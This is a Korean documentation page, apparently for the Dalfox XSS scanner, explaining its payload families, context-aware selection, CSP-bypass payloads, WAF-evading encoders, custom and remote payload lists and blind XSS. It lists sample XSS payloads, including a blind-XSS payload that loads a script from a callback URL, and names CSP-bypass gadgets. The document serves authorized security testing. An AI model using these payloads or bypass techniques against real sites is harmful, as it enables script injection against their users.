+++
title = "페이로드와 인코딩"
description = "Dalfox XSS 페이로드 계열, 컨텍스트 인식 인코더, 커스텀 페이로드, 원격 워드리스트, 블라인드 XSS, 딥 스캔을 설정합니다."
weight = 3
toc = true
+++

Dalfox는 페이로드 라이브러리를 내장하고 있고, 주입 컨텍스트에 맞는 페이로드를 알아서 고릅니다. 그래서 대부분의 스캔은 페이로드 설정이 필요 없습니다. 이 페이지에서는 내장된 내용과 확장하는 방법을 다룹니다.

## 페이로드 계열

Dalfox는 여러 계열로부터 페이로드를 구성합니다:

| 계열 | 예시 | 사용 시점 |
|--------|---------|-----------|
| **HTML 태그** | `<svg onload=alert(1)>` | HTML 컨텍스트 |
| **속성 브레이크아웃** | `'><img src=x onerror=alert(1)>` | 속성 내부 |
| **JavaScript** | `";alert(1);//` | `<script>` 블록 내부 |
| **이벤트 핸들러** | `onmouseover=alert(1)` | 기존 속성 값 |
| **DOM 클로버링** | `<img id=x>` | 레거시 DOM 조회 |
| **URL 프로토콜** | `javascript:alert(1)` | `href`/`src` 계열 속성 |
| **CSP 우회** | `strict-dynamic` 스크립트 가젯, nonce 재사용, 허용된 호스트의 JSONP | 응답에 우회 가능한 CSP가 있을 때 |
| **mXSS** | `<foreignobject>`/DOMPurify 우회 | 새니타이저가 변형한 DOM |
| **블라인드** | `"'><script src=CALLBACK></script>` | `-b`/`--blind` 또는 `--blind-oob`가 설정된 경우 |

대부분의 페이로드 템플릿은 마커(`class={CLASS}` 또는 `id={ID}`)를 지니고 있어, 검증 단계에서 DOM 내에서 자신의 요소를 확실하게 식별할 수 있습니다. 길이 제한이 있는 반사에 들어가도록 마커를 뺀 짧은 페이로드도 몇 개 있는데, 이런 페이로드는 파싱된 응답에서 페이로드 자신의 이벤트 핸들러나 `<script>` 본문을 찾아 검증합니다.

## 컨텍스트 인식 선택

탐색 중 Dalfox는 각 파라미터를 **주입 컨텍스트**, 즉 반사된 값이 도달하는 위치에 따라 분류합니다:

- HTML 본문 → HTML 태그, mXSS, DOM 클로버링 페이로드 (값이 HTML 주석 안에 들어가면 `-->…<!--`로 감쌈)
- 따옴표로 감싼 속성 내부 → 속성 브레이크아웃과 스스로 실행되는 이벤트 핸들러 페이로드. URL 프로토콜 페이로드를 가장 먼저 보냄
- `<script>` 내부 → 문자열 구분자 브레이크아웃(`'-alert(1)-'`, `${alert(1)}` 등)과 `</script>` 태그 브레이크아웃
- `<style>` 내부 → `</style>` 브레이크아웃 뒤에 HTML 태그
- 알 수 없음 → HTML, 속성, mXSS, DOM 클로버링, URL 프로토콜 페이로드를 번갈아 섞은 조합

컨텍스트에 맞는 페이로드만 보내므로 요청 수가 줄어듭니다.

## CSP 우회 페이로드

프리플라이트 응답에 `Content-Security-Policy`(또는 `…-Report-Only`) 헤더가 있거나 같은 정책이 `<meta http-equiv>` 태그에 들어 있으면, Dalfox는 정책을 파싱해서 그 약점을 노리는 스크립트 페이로드를 추가합니다. 실제로 악용할 수 있는 지시어(directive)에만 페이로드를 추가하므로, CSP가 없는 대상에는 요청이 늘지 않습니다.

| CSP 형태 | Dalfox가 보내는 페이로드 |
|-----------|-------------------|
| `unsafe-inline` / `unsafe-eval` | 인라인 페이로드, `eval` 계열 페이로드 |
| `base-uri` / `object-src` 없음 | `<base>` 하이재킹, `<object>`/`<embed>` 주입 |
| `script-src`에 `data:` / `blob:` | `<script src=data:…>`, `Blob` URL 로더 |
| 허용 목록에 있는 CDN 호스트 | 그 호스트에 알려진 JSONP / 프레임워크 스크립트 가젯 |
| `strict-dynamic` | DOM 스크립트 가젯(RequireJS `data-main`, `document.write` 자가 전파, AngularJS 부트스트랩). nonce를 확보했다면 nonce 재사용 페이로드도 보냅니다 |

이 중 두 가지는 조금 더 설명이 필요합니다.

- `strict-dynamic`: 브라우저가 호스트 허용 목록을 무시하므로 평범한 `<script src=allowed-host>`는 로드되지 않습니다. 그래서 Dalfox는 DOM 스크립트 가젯으로 바꿉니다. 이미 신뢰받는 스크립트가 공격자 스크립트를 만들게 하는 페이로드입니다. 정책에 nonce가 고정되어 있으면 `<script nonce=…>` 페이로드도 보냅니다. nonce가 고정값이거나, 예측 가능하거나, 응답에 반사될 때 통합니다.
- nonce / 해시 고정: Dalfox는 `'nonce-…'`와 `'sha256-…'` 토큰을 읽어 정책을 분류합니다. `strict-dynamic`도 가젯 호스트도 없이 무작위 nonce나 해시에만 의존하는 정책은 견고한(hardened) 정책으로 보고 스크립트 페이로드를 보내지 않습니다. `base-uri`나 `object-src`가 없을 때 `<base>`, `<object>` 페이로드만 보냅니다.

가젯은 공개된 CSP 우회 연구(JSONBee, cure53 H5SC, Google CSP Evaluator)에서 가져왔습니다.

## Trusted Types

[Trusted Types](https://web.dev/articles/trusted-types)는 보안을 강화한 앱에서 쓰는 대표적인 DOM-XSS 방어 수단입니다. Dalfox의 AST DOM-XSS 분석기는 이를 고려합니다.

- `createPolicy('p', {createHTML: s => DOMPurify.sanitize(s)})`처럼 엄격한 정책 콜백은 새니타이저로 봅니다. `p.createHTML(x)`를 거친 값은 보고하지 않습니다.
- 잘 알려진 no-op 정책 `createPolicy('default', {createHTML: x => x})` 같은 느슨한 기본 정책은 방어로 치지 않습니다. 탐지 결과는 그대로 남습니다.
- 응답 CSP가 `require-trusted-types-for 'script'`를 강제하고 페이지가 엄격한 `'default'` 정책까지 정의하면, 브라우저가 모든 TrustedHTML 싱크를 알아서 새니타이즈합니다. 이 경우 Dalfox는 오탐이 될 결과를 빼고 보고합니다.

분류기는 보수적으로 판단합니다. 안전하다고 증명하지 못한 정책은 느슨한 정책으로 보므로 결과가 남습니다. 결과를 빼는 것은 정책이 강제될 때뿐입니다. 기본 정책을 정의했어도 `require-trusted-types-for`가 없는 페이지는 계속 보고됩니다.

## 인코더

인코더는 *동일한 페이로드*를 여러 형태로 변환하여, WAF와 서버 측 필터가 모두 같은 바이트를 보지 않도록 합니다.

```bash
dalfox scan https://target.app -e url,html,base64
```

사용 가능한 인코더:

| 인코더 | `<`를 변환하는 형태 | 비고 |
|---------|-------------------|------|
| `none` | `<` (원시) | 인코딩을 끕니다(아래 참고) |
| `url` | `%3C` | 1회 URL 인코딩 |
| `2url` | `%253C` | 2중 URL 인코딩 |
| `3url` | `%25253C` | 3중 |
| `4url` | `%2525253C` | 4중 |
| `html` | `&#x003c;` | 모든 문자를 16진 엔티티로 바꿉니다 |
| `htmlpad` | `&#x000003c;` | 7자리로 0을 채운 16진 엔티티. 영문자, 숫자, 공백은 그대로 둡니다 |
| `base64` | `PA==` | 페이로드 전체를 base64로 인코딩 |
| `unicode` | `＜` | 출력 가능한 ASCII 문자를 전각(fullwidth) 문자(U+FF01–U+FF5E)로 매핑 |
| `zwsp` | `<` + U+200B | `<` `>` `"` `'` `(` `)` `/` `;` 뒤에 폭 없는 공백(zero-width space) 삽입 |

기본값: `url,html`. 원시 페이로드는 항상 함께 전송되므로, 활성화된 인코더마다 기본 페이로드당 변형이 하나씩 늘어납니다(기본값이면 페이로드마다 세 가지 형태로 보냅니다). 목록에 `none`을 추가하면, Dalfox는 원시 페이로드만 보냅니다.

## 커스텀 페이로드

한 줄에 하나씩, 직접 만든 목록을 제공합니다. 빈 줄과 `#`으로 시작하는 줄은 건너뜁니다:

```bash
dalfox scan https://target.app --custom-payload mypayloads.txt
```

로컬 내장 라이브러리 대신 커스텀 파일을 사용합니다:

```bash
dalfox scan https://target.app --custom-payload mypayloads.txt --only-custom-payload
```

`--custom-payload` 없이 `--only-custom-payload`만 주면 거부됩니다. 파일이 없거나 쓸 수 있는 줄이 하나도 없을 때도 마찬가지이며, `--only-custom-payload` 없이 쓸 때는 경고만 하고 내장 페이로드로 스캔합니다. 커스텀 파일이 로컬 반사 및 DOM 검사의 기본 페이로드가 됩니다. 적응형 합성과 CSP/기술 공유 페이로드는 추가하지 않습니다. 인코더와 WAF 변형은 커스텀 항목에서 파생되며, 명시적으로 요청한 `--remote-payloads`는 계속 사용됩니다.

## 원격 페이로드 소스

커뮤니티 워드리스트를 필요할 때 가져옵니다:

```bash
dalfox scan https://target.app --remote-payloads portswigger,payloadbox
```

지원되는 소스: `portswigger`, `payloadbox`. 실행마다 한 번 가져오며, `--proxy`와 `--timeout`을 준수합니다.

## 페이로드 확인하기

스캔을 실행하지 않고 페이로드 계열을 출력합니다. 각 셀렉터의 설명은 [CLI 레퍼런스](../../reference/cli/)에 있습니다. `portswigger`와 `payloadbox`는 원격 목록을 가져오고, 나머지는 내장 목록입니다:

```bash
dalfox payload javascript      # alert(1), alert`1`, prompt(1), ...
dalfox payload event-handlers  # onerror, onmouseover, ...
dalfox payload useful-tags     # svg, img, script, ...
dalfox payload uri-scheme      # javascript:, data:
dalfox payload special-chars   # < > " ' ` ( ) ... 및 인코딩된 변형
dalfox payload functions       # 확인 가능한 싱크: alert(1), window['alert'](1), ...
dalfox payload awesome-alert   # PoC alert: alert(document.domain), alert(document.cookie)
dalfox payload dom-clobbering  # DOM 클로버링 벡터
dalfox payload mxss            # mutation-XSS / 새니타이저 우회 페이로드
dalfox payload blind           # blind-XSS 스켈레톤 ({} = 콜백 URL)
dalfox payload portswigger     # 원격 목록을 가져와 출력
dalfox payload payloadbox      # 원격 목록을 가져와 출력
dalfox payload all             # 모든 로컬 셀렉터를 "# name" 헤더로 묶어 출력
```

모든 셀렉터는 한 줄에 하나씩 출력하므로 일반적인 셸 도구와 조합할 수 있습니다:

```bash
dalfox payload functions | grep -i prompt
dalfox payload special-chars | wc -l
```

`--json`을 붙이면 JSON 배열로 출력합니다(`dalfox payload all --json`은 모든 로컬 그룹을 하나의 배열로 합치고, 셀렉터 없이 `dalfox payload --json`을 실행하면 셀렉터별 개수를 출력합니다).

`special-chars` 그룹은 수동 반사 테스트에 유용합니다. 항목을 하나씩 주입해 어떤 문자가
그대로 돌아오는지, 어떤 문자가 HTML/URL 인코딩되어 돌아오는지, 어떤 문자가 제거되는지 확인할 수
있습니다. `functions`는 눈에 보이게 실행되는 호출을 모았고, `awesome-alert`는 호스트나 오리진까지
보여 주므로 스크린샷 한 장으로 영향을 증명할 수 있습니다.

## "alert" 커스터마이징

전형적인 `alert(1)`은 요란할 수 있습니다. 이를 교체하면 곳곳에서 대화 상자를 띄우지 않고도 영향(impact)을 입증할 수 있습니다:

```bash
# alert(document.domain): 값이 JavaScript 표현식으로 남음
dalfox scan https://target.app --custom-alert-value document.domain

# alert('dalfox'): 값이 문자열 리터럴이 됨
dalfox scan https://target.app --custom-alert-value dalfox --custom-alert-type str
```

- `--custom-alert-value`: `alert(1)` / `prompt(1)` / `confirm(1)` 호출(백틱 형태 포함)의 `1`을 이 값으로 바꿉니다. 기본값 `1`. 주입 컨텍스트가 파악된 파라미터의 주요 반사 페이로드에만 적용되고, DOM 검증용 페이로드와 생성된 페이로드는 `alert(1)`을 그대로 쓰므로 보고된 PoC에 `alert(1)`이 나올 수 있습니다.
- `--custom-alert-type`: `none`(기본값)은 값을 그대로 넣으므로 `document.domain`이 표현식으로 남고, `str`은 값을 작은따옴표로 감싸 문자열 리터럴로 만듭니다.

## Blind XSS

Blind XSS는 나중에, 직접 볼 수 없는 컨텍스트(관리자 패널, 지원 담당자의 대시보드)에서 발동합니다. 대역 외(out-of-band) 리스너가 필요합니다:

```bash
dalfox scan https://target.app -b https://your-callback.interact.sh
```

커스텀 블라인드 템플릿:

```bash
dalfox scan https://target.app \
  -b https://your-callback.example \
  --custom-blind-xss-payload blind-templates.txt
# 각 줄에는 {callback}이 있어야 함(콜백 URL로 치환됨)
```

`{callback}`이 들어 있는 줄만 사용되며, 나머지 줄은 경고와 함께 건너뜁니다. `#` 주석과 빈 줄은 무시합니다. 리터럴 `{}`는 그대로 두므로 템플릿에 `()=>{}` 같은 JavaScript를 넣을 수 있습니다. 그래서 `dalfox payload blind`가 출력하는 `{}` 스켈레톤을 여기에 쓰려면 `{}`를 `{callback}`으로 바꿔야 합니다. 쓸 수 있는 줄이 하나도 없으면 내장 템플릿으로 대체합니다.

직접 운영하는 콜백 서버가 없다면 `--blind-oob`가 interactsh에 등록하고 콜백을 직접 폴링하며, 도착한 콜백은 `V` 탐지 결과가 됩니다. 스캔 모드의 [Blind XSS](../scanning-modes/#blind-xss)를 참고하세요.

## HTTP 파라미터 오염(HPP)

일부 필터는 같은 이름의 파라미터 중 하나만 검사합니다. `--hpp`를 주면 Dalfox는 각 **쿼리** 파라미터의 처음 다섯 개 페이로드를, 파라미터를 중복시킨 채 다시 보냅니다. 페이로드는 마지막 자리, 첫 자리, 양쪽 모두에 넣어 봅니다:

```bash
dalfox scan https://target.app --hpp
```

적중하면 `inject_type`이 `inHTML-HPP`인 `R`로 보고됩니다. 중복 파라미터 처리를 통과했다는 뜻일 뿐 실행 가능한 위치에 도달했다는 증거는 아니므로, 직접 확인하세요.

## 딥 스캔

기본적으로 Dalfox는 검증된 페이로드를 찾으면 해당 파라미터에 대한 테스트를 중단합니다. `--deep-scan`은 계속 진행하며, 파라미터당 기본 페이로드 3000개라는 내장 상한도 해제합니다([CLI 레퍼런스](../../reference/cli/)의 `--max-payloads-per-param` 참고):

```bash
dalfox scan https://target.app --deep-scan
```

연구에는 유용하지만, 프로덕션 파이프라인에서는 더 느립니다.

## 페이로드 단계 건너뛰기

| 플래그 | 효과 |
|------|--------|
| `--skip-xss-scanning` | 탐색과 프로빙만 수행; 페이로드 주입 없음 |
| `--skip-ast-analysis` | 인라인 스크립트의 AST 기반 DOM-XSS 탐지 건너뛰기 (`[A]` 결과) |

`--skip-ast-analysis`는 `source → sink` 흐름(예: `location.hash` → `innerHTML`)을 `[A]`(AST 탐지) 결과로 보고하는 정적 DOM-XSS 패스를 끕니다. 이 패스는 파라미터 마이닝과 별개이며, `--skip-mining-dom`은 이 패스에 영향을 주지 않습니다. 패스는 그대로 두고 결과에서만 숨기려면 `--only-poc v,r`을 사용하세요. `[A]`가 실제로 무엇을 증명하는지, 그리고 순수 클라이언트 사이드 DOM-XSS가 왜 `[V]`에 도달하지 못하는지는 [탐지 모델](../detection-model/) 문서에서 다룹니다.

## 다음 단계

- [WAF 우회](../waf-bypass/)와 함께 쓰면 필터를 비껴가도록 페이로드를 다듬을 수 있습니다.
- 탐지 결과를 내보내려면 [출력과 리포트](../output/)를 참고하세요.
